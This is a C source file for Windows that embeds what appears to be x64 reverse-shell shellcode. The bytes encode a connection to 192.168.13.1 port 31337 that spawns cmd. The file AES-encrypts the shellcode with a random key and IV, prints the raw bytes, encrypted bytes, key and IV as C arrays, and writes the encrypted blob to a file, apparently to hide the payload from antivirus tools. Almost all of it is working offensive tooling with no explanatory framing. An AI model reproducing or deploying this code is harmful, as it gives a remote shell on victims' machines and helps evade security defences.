#include <stdio.h>
#include <Windows.h>
#include "aes.h"
unsigned char payload[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x7a\x69\xc0\xa8\x0d\x01"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

// Encrypt the payload with AES
// tiny-AES - https://github.com/kokke/tiny-AES-c

// set the size of the AES key as 32 and the size of the IV (Initialization Vector) as 16
#define KEYSIZE 32
#define IVSIZE 16

#define OUTPUT_FILE "encrypted_shellcode.bin"

VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

	printf("unsigned char %s[] = {", Name);

	for (int i = 0; i < Size; i++) {
		if (i % 16 == 0) {
			printf("\n\t");
		}
		if (i < Size - 1) {
			printf("0x%0.2X, ", Data[i]);
		}
		else {
			printf("0x%0.2X ", Data[i]);
		}
	}

	printf("};\n\n\n");

}

BOOL WritePayloadFile(const char* FileInput, DWORD sPayloadSize, unsigned char* pPayloadData) {

	HANDLE	hFile = INVALID_HANDLE_VALUE;
	DWORD	lpNumberOfBytesWritten = 0;

	hFile = CreateFileA(FileInput, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
	    return FALSE;
	}


	if (!WriteFile(hFile, pPayloadData, sPayloadSize, &lpNumberOfBytesWritten, NULL) || sPayloadSize != lpNumberOfBytesWritten) {
	    return FALSE;
	}

	CloseHandle(hFile);

	return TRUE;
}

VOID RandBytes(PBYTE pByte, SIZE_T sSize) {
    for(int i = 0; i < sSize; i++) {
        pByte[i] = (BYTE)rand() % 0xFF;
    }
}

BOOL EncryptAES(IN PBYTE pRawDataBuffer, IN SIZE_T sRawBufferSize, IN PBYTE pAesKey, IN PBYTE pAesIv, OUT PBYTE* pEncryptedBuffer, OUT SIZE_T* pEncryptedBufferSize) {

	if (!pRawDataBuffer || !sRawBufferSize || !pAesKey || !pAesIv || !pRawDataBuffer|| !sRawBufferSize)
		return FALSE;

	PBYTE	pNewBuffer		= pRawDataBuffer;
	SIZE_T	sNewBufferSize	= sRawBufferSize;
	struct	AES_ctx AesCtx	= { 0x00 };

	if (sRawBufferSize % 16 != 0x00) {

		sNewBufferSize		= sRawBufferSize + 16 - (sRawBufferSize % 16);
		pNewBuffer			= HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNewBufferSize);

		if (!pNewBuffer) {
			printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
			return FALSE;
		}

		memcpy(pNewBuffer, pRawDataBuffer, sRawBufferSize);
	}

	RtlSecureZeroMemory(&AesCtx, sizeof(AesCtx));
	AES_init_ctx_iv(&AesCtx, pAesKey, pAesIv);
	AES_CBC_encrypt_buffer(&AesCtx, pNewBuffer, sNewBufferSize);

	//  returning the encrypted buffer
	*pEncryptedBufferSize= sNewBufferSize;
	*pEncryptedBuffer = pNewBuffer;

	return TRUE;
}

int main() {
    SIZE_T sRawShellcodeSize = sizeof(payload);
    BYTE pAesKey[KEYSIZE];
    BYTE pAesIv[IVSIZE];
    PBYTE pEncryptedShellcode = NULL;
    SIZE_T sEncryptedShellcodeSize = 0;

    srand(time(NULL)); // set the seed
    RandBytes(pAesKey, KEYSIZE); // create random bytes

    srand (time(NULL) ^ pAesKey[0]); // create the seed from the first byte of the AES key
    RandBytes(pAesIv, IVSIZE); // generate IV


    printf("// [+] Size of payload: %d \n", sRawShellcodeSize);

    PrintHexData("raw_payload", payload, sRawShellcodeSize);
    if (!EncryptAES(payload, sRawShellcodeSize, pAesKey, pAesIv, &pEncryptedShellcode, &sEncryptedShellcodeSize)) {
        printf("[!] Shellcode Encryption failed with error: %d", GetLastError());
        return -1;
    }

    PrintHexData("encrypted_payload", pEncryptedShellcode , sEncryptedShellcodeSize);
    PrintHexData("AesKey", pAesKey, KEYSIZE);
    PrintHexData("AesIv", pAesIv, IVSIZE);

    if (!WritePayloadFile(OUTPUT_FILE, sEncryptedShellcodeSize, pEncryptedShellcode)) {
        printf("[!] Failed to write file to %s with error: %d", OUTPUT_FILE, GetLastError());
        return -1;
    }

    return 0;
}
